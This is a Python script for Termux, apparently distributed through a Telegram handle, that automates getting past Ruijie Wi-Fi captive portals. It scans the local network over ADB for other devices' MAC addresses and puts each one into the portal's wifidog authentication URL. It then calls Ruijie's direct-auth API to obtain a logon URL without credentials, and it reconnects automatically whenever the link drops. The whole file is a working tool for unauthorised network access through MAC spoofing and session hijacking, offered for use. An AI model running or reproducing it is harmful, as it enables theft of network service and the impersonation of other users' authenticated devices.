# ============================================================
# SPIDER-MAN MACHINE BYPASS - WITH MACHINE LOGO
# Telegram: @Spider_man1245
# Build for the dark.
# ============================================================

import re, time, os, subprocess, sys, requests, json
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLORS ====================
W = "\033[1;00m"
G = "\033[1;32m"
Y = "\033[1;33m"
R = "\033[1;31m"
B = "\033[1;34m"
C = "\033[1;36m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ==================== MACHINE LOGO ====================
def machine_logo():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""{C}
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║    ███╗   ███╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗███████╗    ║
    ║    ████╗ ████║ ██╔══██╗██╔════╝██║  ██║██║████╗  ██║██╔════╝    ║
    ║    ██╔████╔██║ ███████║██║     ███████║██║██╔██╗ ██║█████╗      ║
    ║    ██║╚██╔╝██║ ██╔══██║██║     ██╔══██║██║██║╚██╗██║██╔══╝      ║
    ║    ██║ ╚═╝ ██║ ██║  ██║╚██████╗██║  ██║██║██║ ╚████║███████╗    ║
    ║    ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝    ║
    ║                                                                  ║
    ║    ███████╗██████╗ ██╗██████╗ ███████╗██████╗ ███╗   ███╗ █████╗ ███╗   ██╗
    ║    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗████╗ ████║██╔══██╗████╗  ██║
    ║    ███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝██╔████╔██║███████║██╔██╗ ██║
    ║    ╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══██║██║╚██╗██║
    ║    ███████║██║     ██║██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║
    ║    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
    ║                                                                  ║
    ║    ╔══════════════════════════════════════════════════════════╗  ║
    ║    ║  {Y}🕷️  SPIDER-MAN HACKER MACHINE  v3.0  🕷️{G}              ║  ║
    ║    ║  {R}🔥  RUIJIE BYPASS ENGINE  FOR TERMUX  🔥{G}             ║  ║
    ║    ║  {C}⚡  TELEGRAM: @Spider_man1245  ⚡{G}                   ║  ║
    ║    ╚══════════════════════════════════════════════════════════╝  ║
    ║                                                                  ║
    ║    {Y}[✓] SYSTEM READY  [✓] BYPASS ENGINE LOADED  [✓] MAC SCANNER ACTIVE{G}  ║
    ║    {C}[🕷️] SPIDER-MAN ACTIVE  [⚡] HACK MODE ENABLED{G}              ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    {RESET}""")

def line():
    print(f"{Y}-{W}" * 55)

def loading_animation():
    """Loading animation for machine feel"""
    print(f"{C}[*] Initializing Spider-Man Bypass Engine...{RESET}")
    for i in range(21):
        sys.stdout.write(f"\r{Y}[{'█' * i}{'░' * (20 - i)}] {i*5}%{RESET}")
        sys.stdout.flush()
        time.sleep(0.05)
    print(f"\n{G}[✓] Engine Ready!{RESET}\n")

# ==================== CORE FUNCTIONS ====================
def get_gateway():
    """Get gateway IP"""
    try:
        out = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode()
        m = re.search(r'default\s+via\s+(\d+\.\d+\.\d+\.\d+)', out)
        if m:
            return m.group(1)
    except:
        pass
    return "192.168.1.1"

def get_portal_url():
    """Get Ruijie portal URL"""
    gw = get_gateway()
    urls = [
        f"http://{gw}",
        f"http://{gw}:2060",
        "http://connectivitycheck.gstatic.com/generate_204"
    ]
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10)'})
    
    for url in urls:
        try:
            resp = session.get(url, timeout=3, allow_redirects=True, verify=False)
            if "portal-as.ruijienetworks.com" in resp.url:
                return resp.url
            if "portal-as" in resp.text:
                m = re.search(r'href=["\'](https?://portal-as[^"\']+)["\']', resp.text, re.I)
                if m:
                    return m.group(1)
        except:
            continue
    return None

def scan_macs():
    """Scan for MAC addresses - MACHINE SCANNER"""
    macs = []
    print(f"{C}[🕷️] Starting MAC Scanner...{RESET}")
    
    try:
        # ARP scan
        out = subprocess.check_output("adb shell ip neigh show", shell=True, stderr=subprocess.DEVNULL).decode()
        for line in out.split('\n'):
            if any(x in line for x in ['REACHABLE', 'STALE', 'DELAY']):
                m = re.search(r'lladdr\s+([0-9a-fA-F:]{17})', line)
                if m and m.group(1) not in macs:
                    macs.append(m.group(1))
    except:
        pass
    
    # If no macs, try ping sweep - MACHINE SCAN
    if not macs:
        print(f"{Y}[*] Scanning network with ping sweep...{RESET}")
        try:
            subnet = "192.168.1"
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                subprocess.run(f"adb shell ping -c 1 -W 1 {ip}", shell=True, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            out = subprocess.check_output("adb shell ip neigh show", shell=True, 
                                         stderr=subprocess.DEVNULL).decode()
            for line in out.split('\n'):
                if 'lladdr' in line:
                    m = re.search(r'lladdr\s+([0-9a-fA-F:]{17})', line)
                    if m and m.group(1) not in macs:
                        macs.append(m.group(1))
        except:
            pass
    
    print(f"{G}[✓] Found {len(macs)} MACs{RESET}")
    return macs

def spider_bypass(portal_url, mac):
    """Spider-Man bypass engine"""
    try:
        # Build API URL
        if '/auth/wifidogAuth/login' in portal_url:
            api = portal_url.replace('/auth/wifidogAuth/login/?', '/api/auth/wifidog?stage=portal&')
            api = api.replace('/auth/wifidogAuth/login?', '/api/auth/wifidog?stage=portal&')
        else:
            api = portal_url
        
        # Replace MAC
        new_url = re.sub(r'(?<=mac=)[^&]+', mac, api)
        
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10)',
            'Connection': 'Keep-Alive'
        })
        
        # Get session ID
        r1 = s.get(new_url, timeout=5, allow_redirects=True, verify=False)
        if 'sessionId=' in r1.url:
            sid = r1.url.split('sessionId=')[1].split('&')[0]
        else:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', r1.text)
            if not m:
                return False
            sid = m.group(1)
        
        # Send payload
        pwn_url = "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US"
        payload = {"phoneNumber": "", "sessionId": sid}
        r2 = s.post(pwn_url, json=payload, timeout=5, verify=False)
        logon = r2.json().get('result', {}).get('logonUrl', '')
        if not logon:
            return False
        
        # Finalize
        if ':2060' in logon:
            final = re.sub(r'\d+\.\d+\.\d+\.\d+', '10.44.77.240', logon)
            if s.get(final, timeout=5, verify=False).status_code == 200:
                return True
        else:
            if s.get(logon, timeout=5, verify=False).status_code == 200:
                return True
        return False
    except:
        return False

def monitor_connection(mac):
    """Monitor connection with machine style"""
    print(f"\n{G}╔═══════════════════════════════════════════╗{RESET}")
    print(f"{G}║  ✅  BYPASS SUCCESSFUL!  ✅              ║{RESET}")
    print(f"{G}╚═══════════════════════════════════════════╝{RESET}")
    print(f"{C}Active MAC: {G}{mac}{RESET}")
    line()
    
    fail = 0
    while True:
        try:
            out = subprocess.check_output(['ping', '-c', '1', '-W', '1', '8.8.8.8'], 
                                         stderr=subprocess.DEVNULL, universal_newlines=True)
            m = re.search(r'time[=<](\d+\.?\d*)', out)
            if m:
                val = float(m.group(1))
                col = G if val < 100 else (Y if val < 300 else R)
                print(f"\r{C}[🕷️] MACHINE CONNECT{RESET} | {G}ONLINE{RESET} | Ping: {col}{val}ms{RESET}    ", end='')
                fail = 0
            else:
                raise Exception()
        except:
            print(f"\r{C}[🕷️] MACHINE CONNECT{RESET} | {R}OFFLINE{RESET} | Ping: {R}Timeout{RESET}    ", end='')
            fail += 1
        
        # Reconnect if offline too long
        if fail >= 5:
            print(f"\n{Y}[*] Reconnecting...{RESET}")
            portal = get_portal_url()
            if portal:
                spider_bypass(portal, mac)
            fail = 0
        time.sleep(1)

# ==================== MENU ====================
def menu():
    machine_logo()
    print(f"{B}╔═══════════════════════════════════════════════════════════╗{W}")
    print(f"{B}║{W}  🕷️  SPIDER-MAN MACHINE BYPASS MENU                  {B}║{W}")
    print(f"{B}╠═══════════════════════════════════════════════════════════╣{W}")
    print(f"{B}║{W}  1. 🚀 AUTO BYPASS (One Click)                       {B}║{W}")
    print(f"{B}║{W}  2. 🔄 RECONNECT (If offline)                        {B}║{W}")
    print(f"{B}║{W}  3. 📊 CHECK STATUS & MACHINE INFO                   {B}║{W}")
    print(f"{B}║{W}  4. 🕷️  SHOW MACHINE LOGO                            {B}║{W}")
    print(f"{B}║{W}  5. ❌ EXIT                                          {B}║{W}")
    print(f"{B}╚═══════════════════════════════════════════════════════════╝{W}")
    line()

def auto_bypass():
    """One-click auto bypass with machine style"""
    machine_logo()
    print(f"\n{C}[🕷️] Starting Machine Bypass...{RESET}")
    line()
    
    # Get portal
    print(f"{Y}[*] Finding portal...{RESET}")
    portal = get_portal_url()
    if not portal:
        print(f"{R}❌ No portal found! Check WiFi connection.{RESET}")
        input(f"\n{Y}Press Enter to continue...{RESET}")
        return
    
    print(f"{G}✅ Portal found: {C}{portal[:50]}...{RESET}")
    
    # Scan MACs with animation
    macs = scan_macs()
    if not macs:
        print(f"{R}❌ No MACs found! Make sure ADB is connected.{RESET}")
        input(f"\n{Y}Press Enter to continue...{RESET}")
        return
    
    print(f"{G}✅ Found {len(macs)} MACs{RESET}")
    
    # Try each MAC with progress
    print(f"\n{C}[*] Initiating bypass sequence...{RESET}")
    for i, mac in enumerate(macs, 1):
        sys.stdout.write(f"\r{Y}[*] Trying {i}/{len(macs)}: {mac}{' ' * 20}{RESET}")
        sys.stdout.flush()
        if spider_bypass(portal, mac):
            print(f"\n{G}✅ Success with MAC: {mac}{RESET}")
            monitor_connection(mac)
            return
    
    print(f"\n{R}❌ All MACs failed!{RESET}")
    input(f"\n{Y}Press Enter to continue...{RESET}")

def check_connection():
    """Check connection with machine info"""
    machine_logo()
    print(f"\n{C}📊 MACHINE STATUS{RESET}")
    line()
    
    print(f"{C}┌─────────────────────────────────────┐{RESET}")
    print(f"{C}│  SYSTEM INFORMATION                │{RESET}")
    print(f"{C}├─────────────────────────────────────┤{RESET}")
    
    # Check internet
    try:
        out = subprocess.check_output(['ping', '-c', '2', '-W', '2', '8.8.8.8'], 
                                     stderr=subprocess.DEVNULL, universal_newlines=True)
        if 'ttl=' in out.lower() or 'time=' in out.lower():
            print(f"{G}│  Internet: CONNECTED              │{RESET}")
            m = re.search(r'time[=<](\d+\.?\d*)', out)
            if m:
                print(f"{W}│  Ping: {C}{m.group(1)}ms{RESET}")
        else:
            print(f"{R}│  Internet: OFFLINE               │{RESET}")
    except:
        print(f"{R}│  Internet: OFFLINE               │{RESET}")
    
    # Check ADB
    try:
        subprocess.check_output("adb devices", shell=True, stderr=subprocess.DEVNULL)
        print(f"{G}│  ADB: CONNECTED                  │{RESET}")
    except:
        print(f"{R}│  ADB: NOT CONNECTED              │{RESET}")
    
    # Check Python version
    print(f"{W}│  Python: {sys.version[:10]}{RESET}")
    
    # Check OS
    print(f"{W}│  OS: {os.name}{RESET}")
    
    print(f"{C}└─────────────────────────────────────┘{RESET}")
    
    input(f"\n{Y}Press Enter to continue...{RESET}")

def show_logo():
    """Show machine logo only"""
    machine_logo()
    line()
    print(f"{C}   🕷️  SPIDER-MAN MACHINE v3.0  🕷️{RESET}")
    print(f"{Y}   🔥  Built for the dark  🔥{RESET}")
    print(f"{G}   ⚡  Telegram: @Spider_man1245  ⚡{RESET}")
    line()
    input(f"\n{Y}Press Enter to continue...{RESET}")

# ==================== MAIN ====================
if __name__ == "__main__":
    # Show loading animation
    machine_logo()
    loading_animation()
    
    # Start ADB
    try:
        subprocess.run(["adb", "start-server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{G}[✓] ADB Server Started{RESET}")
    except:
        pass
    
    time.sleep(1)
    
    while True:
        menu()
        choice = input(f"\n{Y}Choice: {RESET}").strip()
        
        if choice == '1':
            auto_bypass()
        elif choice == '2':
            machine_logo()
            print(f"\n{C}[🔄] Reconnecting...{RESET}")
            portal = get_portal_url()
            if portal:
                macs = scan_macs()
                for mac in macs:
                    if spider_bypass(portal, mac):
                        print(f"{G}✅ Reconnected with {mac}{RESET}")
                        monitor_connection(mac)
                        break
            input(f"\n{Y}Press Enter...{RESET}")
        elif choice == '3':
            check_connection()
        elif choice == '4':
            show_logo()
        elif choice == '5':
            print(f"\n{G}🕷️ Spider-Man Machine shutting down...{RESET}")
            print(f"{C}   Goodbye, hacker!{RESET}")
            sys.exit(0)
        else:
            print(f"{R}Invalid choice!{RESET}")
            time.sleep(1)